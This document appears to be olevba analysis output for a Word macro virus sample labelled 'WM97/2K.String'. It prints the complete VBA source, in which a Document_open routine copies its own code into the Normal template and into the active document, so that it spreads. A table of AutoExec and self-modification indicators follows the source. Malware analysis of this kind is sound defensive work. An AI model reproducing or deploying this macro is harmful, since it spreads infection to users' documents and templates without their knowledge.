olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.String
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.String - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Close()

End Sub

'e[ax]
Private Sub Document_open()
Dim KVICKJS, CHSJEUR, LCXJSIE, OCKAJRF, SIFDMXU
Set CHSJEUR = ThisDocument.VBProject.VBComponents(1).codemodule
Set OCKAJRF = NormalTemplate.VBProject.VBComponents(1).codemodule
Set LCXJSIE = ActiveDocument.VBProject.VBComponents(1).codemodule
KVICKJS = Strings.Trim(CHSJEUR.lines(1, CHSJEUR.countoflines))
SIFDMXU = Strings.LCase("'e[ax]")
If SIFDMXU <> OCKAJRF.lines(1, 1) Then
With OCKAJRF
.deletelines 1, OCKAJRF.countoflines
.InsertLines 1, KVICKJS
End With
End If
If SIFDMXU <> LCXJSIE.lines(1, 1) Then
With LCXJSIE
.deletelines 1, LCXJSIE.countoflines
.InsertLines 1, KVICKJS
End With
End If
'WM97/2K.String by e[ax]
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

